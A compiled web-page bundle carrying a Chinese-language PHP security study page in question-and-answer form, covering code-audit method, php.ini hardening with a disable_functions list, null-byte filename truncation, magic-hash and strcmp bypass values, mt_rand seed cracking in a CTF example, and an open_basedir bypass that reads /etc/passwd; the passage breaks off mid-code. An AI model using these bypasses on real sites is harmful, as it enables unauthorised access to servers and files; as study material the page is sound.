(window.webpackJsonp=window.webpackJsonp||[]).push([[110],{842:function(s,t,a){"use strict";a.r(t);var n=a(103),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"php安全相关"}},[s._v("PHP安全相关 "),a("a",{staticClass:"header-anchor",attrs:{href:"#php安全相关"}},[s._v("#")])]),s._v(" "),a("h1",{attrs:{id:"何为代码审计"}},[s._v("何为代码审计？ "),a("a",{staticClass:"header-anchor",attrs:{href:"#何为代码审计"}},[s._v("#")])]),s._v(" "),a("p",[s._v("代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。")]),s._v(" "),a("p",[s._v("内容包括：")]),s._v(" "),a("blockquote",[a("ol",[a("li",[s._v("前后台分离的运行架构")]),s._v(" "),a("li",[s._v("Web服务的目录权限分类")]),s._v(" "),a("li",[s._v("认证会话与应用平台的结合")]),s._v(" "),a("li",[s._v("数据库的配置规范")]),s._v(" "),a("li",[s._v("SQL语句的编写规范")]),s._v(" "),a("li",[s._v("Web服务的权限配置")]),s._v(" "),a("li",[s._v("对抗爬虫引擎的处理措施")])])]),s._v(" "),a("h1",{attrs:{id:"你审计的关键点"}},[s._v("你审计的关键点？ "),a("a",{staticClass:"header-anchor",attrs:{href:"#你审计的关键点"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("！！！首先要搞清楚目录结构，程序有哪些功能，查看 config 配置文件！！！")])]),s._v(" "),a("p",[s._v("一、如果是CMS，搜索公开漏洞，对比同版本文件差异")]),s._v(" "),a("p",[s._v("二、查看敏感函数、回溯变量，判断变量在调用前是否经过安全过滤")]),s._v(" "),a("p",[s._v("三、查看公共函数、过滤函数是否存在漏洞和可绕过的点")]),s._v(" "),a("p",[s._v("​\t\t函数命名上会包含"),a("code",[s._v("common")]),s._v("、"),a("code",[s._v("function")]),s._v("、"),a("code",[s._v("filter")]),s._v("、"),a("code",[s._v("safe")]),s._v("、"),a("code",[s._v("check")]),s._v("等关键词")]),s._v(" "),a("p",[s._v("四、查看敏感功能点，正向追踪变量传递过程，重点关注用户可控变量")])]),s._v(" "),a("h1",{attrs:{id:"参考链接"}},[a("a",{attrs:{href:"https://wooyun.js.org/drops/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("参考链接"),a("OutboundLink")],1),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#参考链接"}},[s._v("#")])]),s._v(" "),a("h1",{attrs:{id:"你用什么工具提高效率"}},[s._v("你用什么工具提高效率？ "),a("a",{staticClass:"header-anchor",attrs:{href:"#你用什么工具提高效率"}},[s._v("#")])]),s._v(" "),a("p",[s._v("Fortify")]),s._v(" "),a("p",[a("strong",[s._v("submile代码审计插件")])]),s._v(" "),a("p",[a("a",{attrs:{href:"https://github.com/5alt/VulHint",target:"_blank",rel:"noopener noreferrer"}},[s._v("VulHint"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("a",{attrs:{href:"https://github.com/WangYihang/Find-PHP-Vulnerabilities",target:"_blank",rel:"noopener noreferrer"}},[s._v("Find-PHP-Vulnerabilities"),a("OutboundLink")],1)]),s._v(" "),a("h1",{attrs:{id:"为什么有的时候没有错误回显-用php举例"}},[s._v("为什么有的时候没有错误回显，用php举例 "),a("a",{staticClass:"header-anchor",attrs:{href:"#为什么有的时候没有错误回显-用php举例"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。")]),s._v(" "),a("p",[s._v("在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用")]),s._v(" "),a("p",[s._v("除了上面的，还可以在执行语句前面添加@")])]),s._v(" "),a("h1",{attrs:{id:"php-ini可以设置哪些安全特性"}},[s._v("php.ini可以设置哪些安全特性 "),a("a",{staticClass:"header-anchor",attrs:{href:"#php-ini可以设置哪些安全特性"}},[s._v("#")])]),s._v(" "),a("h3",{attrs:{id:"关闭错误回显"}},[a("strong",[s._v("关闭错误回显")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#关闭错误回显"}},[s._v("#")])]),s._v(" "),a("p",[s._v("防止利用错误信息反馈获取网站敏感信息")]),s._v(" "),a("h3",{attrs:{id:"设置open-basedir-var-www-html"}},[a("strong",[s._v("设置open_basedir")]),s._v("= /var/www/html "),a("a",{staticClass:"header-anchor",attrs:{href:"#设置open-basedir-var-www-html"}},[s._v("#")])]),s._v(" "),a("p",[s._v("限制 PHP 脚本能访问的目录，一定程度下可降低Webshell的危害")]),s._v(" "),a("h3",{attrs:{id:"禁用危险函数"}},[a("strong",[s._v("禁用危险函数")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#禁用危险函数"}},[s._v("#")])]),s._v(" "),a("p",[s._v("如果不希望执行包括"),a("code",[s._v("system()")]),s._v("等在内的执行命令的 PHP 函数")]),s._v(" "),a("p",[s._v("以及能够查看 PHP 信息的"),a("code",[s._v("phpinfo()")]),s._v("等函数")]),s._v(" "),a("p",[s._v("可以通过以下设置禁止这些函数")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("disable_functions "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" phpinfo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" passthru"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" exec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" shell_exec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" popen"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" escapeshellarg"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" escapeshellcmd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" proc_close"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" proc_open"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" dl\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"打开magic-quotes-gpc魔术引号"}},[a("strong",[s._v("打开magic_quotes_gpc魔术引号")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#打开magic-quotes-gpc魔术引号"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("magic_quotes_gpc "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" on\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("魔术引号自动过滤 GET/POST/COOKIE 可以防止SQL注入")]),s._v(" "),a("p",[s._v("但是 php<5.4不会处理$_SERVER(client-ip/referer注入)  详情参见"),a("a",{attrs:{href:"https://www.seebug.org/vuldb/ssvid-30102",target:"_blank",rel:"noopener noreferrer"}},[s._v("CVE-2012-0831"),a("OutboundLink")],1)]),s._v(" "),a("h3",{attrs:{id:"关闭注册全局变量"}},[a("strong",[s._v("关闭注册全局变量")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#关闭注册全局变量"}},[s._v("#")])]),s._v(" "),a("p",[s._v("在 PHP 环境中提交的变量，包括使用 POST 或者 GET 命令提交的变量")]),s._v(" "),a("p",[s._v("都将自动注册为全局变量，能够被直接访问 (PHP<5.4.0)。")]),s._v(" "),a("p",[s._v("这对服务器是非常不安全的，应该将注册全局变量的选项关闭，禁止将所提交的变量注册为全局变量。")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("register_globals "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" off\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"关闭-php-版本信息在-http-头中的泄露"}},[a("strong",[s._v("关闭 PHP 版本信息在 HTTP 头中的泄露")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#关闭-php-版本信息在-http-头中的泄露"}},[s._v("#")])]),s._v(" "),a("p",[s._v("为了防止黑客获取服务器中 PHP 版本的信息，可以禁止该信息在 HTTP 头部内容中泄露")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("expose_php "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" off\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"错误信息控制"}},[a("strong",[s._v("错误信息控制")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#错误信息控制"}},[s._v("#")])]),s._v(" "),a("p",[s._v("一般 PHP 环境在没有连接到数据库或者其他情况下会有错误提示信息")]),s._v(" "),a("p",[s._v("错误信息中可能包含 PHP 脚本当前的路径信息或者查询的 SQL 语句等信息")]),s._v(" "),a("p",[s._v("这类信息如果暴露给黑客是不安全的，应该禁止该错误提示：")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("display_errors "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Off\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如果确实要显示错误信息，一定要设置显示错误信息的级别。")]),s._v(" "),a("p",[s._v("例如，只显示警告以上的错误信息：")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("error_reporting "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("E_WARNING")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("E_ERROR")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"错误日志"}},[a("strong",[s._v("错误日志")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#错误日志"}},[s._v("#")])]),s._v(" "),a("p",[s._v("建议在关闭错误提示信息后，对于错误信息进行记录，便于排查服务器运行异常的原因：")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("log_errors "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" On\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("同时，需要设置错误日志存放的目录，将 PHP 错误日志与 Apache 的日志存放在同一目录下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("error_log = /usr/local/apache2/logs/php_error.log\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("注意")]),s._v("： 该文件必须设置允许 Apache 用户或用户组具有写的权限。")]),s._v(" "),a("h1",{attrs:{id:"php的-00-截断的原理是什么"}},[s._v("PHP的 %00 截断的原理是什么？ "),a("a",{staticClass:"header-anchor",attrs:{href:"#php的-00-截断的原理是什么"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[a("code",[s._v("存在于 < 5.3.4版本")]),s._v("，GPC关闭")]),s._v("，一般利用在对文件进行操作时，如文件上传时文件名的截断")]),s._v(" "),a("p",[s._v("如"),a("code",[s._v("filename=test.php%00.txt")]),s._v(" 会被截断成test.php，00后面的被忽略")]),s._v(" "),a("p",[s._v("系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了")]),s._v(" "),a("blockquote",[a("p",[s._v("因为PHP使用C语言编写，C语言的字符串结束标志是字符 "),a("code",[s._v("\\0")]),s._v(" ，它的ASCII码值是 0")])]),s._v(" "),a("h1",{attrs:{id:"php弱类型"}},[s._v("PHP弱类型 "),a("a",{staticClass:"header-anchor",attrs:{href:"#php弱类型"}},[s._v("#")])]),s._v(" "),a("p",[s._v("如果用"),a("code",[s._v("==")]),s._v("比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行")]),s._v(" "),a("p",[a("code",[s._v("0e")]),s._v("开头的字符串等于0")]),s._v(" "),a("p",[s._v("进行比较运算时，如果遇到了"),a("code",[s._v("0e\\d+")]),s._v("这种字符串，就会将这种字符串解析为科学计数法")]),s._v(" "),a("p",[a("strong",[s._v("0e开头的MD5和原字符串（用于MD5碰撞）")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("s878926199a\n0e545993274517709034328855841020\n\ns155964671a\n0e342768416822451524974117254469\n\ns214587387a\n0e848240448830537924465865611904\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("?kekeyy1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("xxx"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("kekeyy2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("md5()函数无法处理数组，如果传入的为数组，会返回NULL")]),s._v(" "),a("p",[s._v("所以两个数组经过加密后得到的都是NULL,也就是相等的")]),s._v(" "),a("p",[a("strong",[s._v("值为NULL的MD5：")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("**strcmp()：**需要给strcmp()传递2个string类型的参数")]),s._v(" "),a("blockquote",[a("p",[s._v("如果str1小于str2,返回-1，相等返回0，否则返回1")]),s._v(" "),a("p",[s._v("strcmp比较出错 => 返回NULL => NULL==0 => get flag!")])]),s._v(" "),a("h1",{attrs:{id:"变量覆盖"}},[s._v("变量覆盖 "),a("a",{staticClass:"header-anchor",attrs:{href:"#变量覆盖"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("$$容易引发变量覆盖")])]),s._v(" "),a("blockquote",[a("p",[s._v("$GLOBALS — 引用全局作用域中可用的全部变量\t\t(PHP手册)")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$args")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("GLOBALS")]),s._v(" 和 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("var_dump")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$$args")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" 前面那个 $ 组成 "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$GLOBALS")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h1",{attrs:{id:"php伪随机数爆破"}},[s._v("PHP伪随机数爆破 "),a("a",{staticClass:"header-anchor",attrs:{href:"#php伪随机数爆破"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种")]),s._v(" "),a("p",[s._v("PHP的mt_rand()函数生成的随机数只跟seed和调用该函数的次数有关。")])]),s._v(" "),a("p",[s._v("当得到seed数值后，就可以预测出接下来的数值是多少，这是该函数的一个问题，它并不能起到一个真随机数的作用")]),s._v(" "),a("p",[s._v("seed获取需要利用一个爆破工具："),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("https"),a("OutboundLink")],1),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("😕/github.com/"),a("OutboundLink")],1),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("lepiaf"),a("OutboundLink")],1),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("/"),a("OutboundLink")],1),a("a",{attrs:{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank",rel:"noopener noreferrer"}},[s._v("php_mt_seed"),a("OutboundLink")],1)]),s._v(" "),a("h2",{attrs:{id:"例题"}},[s._v("例题： "),a("a",{staticClass:"header-anchor",attrs:{href:"#例题"}},[s._v("#")])]),s._v(" "),a("p",[s._v("把题目给的生成的一组随机数的第一个数用作爆破")]),s._v(" "),a("p",[s._v("可能爆破出来多个种子，自己本地测试下")]),s._v(" "),a("p",[s._v("题目：srand.php")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"PHP 7.x"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_srand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("xxxxxxxx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token shell-comment comment"}},[s._v("# We can't tell you what is xxxxxxxx!")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"echo flag{"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"}"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n984489752\n619387123\n2070958802\n2105559368\n1909473866\n1679323715\n1910332168\n640569646\n1103001695\n1871111424\nflag\n\nSo, Please guess the flag!\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./php_mt_seed "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("984489752")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h1",{attrs:{id:"绕过open-basedir列目录"}},[s._v("绕过Open_basedir列目录 "),a("a",{staticClass:"header-anchor",attrs:{href:"#绕过open-basedir列目录"}},[s._v("#")])]),s._v(" "),a("h3",{attrs:{id:"_1、system命令执行函数绕过"}},[s._v("1、system命令执行函数绕过 "),a("a",{staticClass:"header-anchor",attrs:{href:"#_1、system命令执行函数绕过"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("open_basedir 的设置对system等命令执行函数是无效的，所以可以用命令执行函数来访问限制目录")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cat ../../../../../etc/passwd"')]),a("span",{pre:!0,attrs:{class:"token 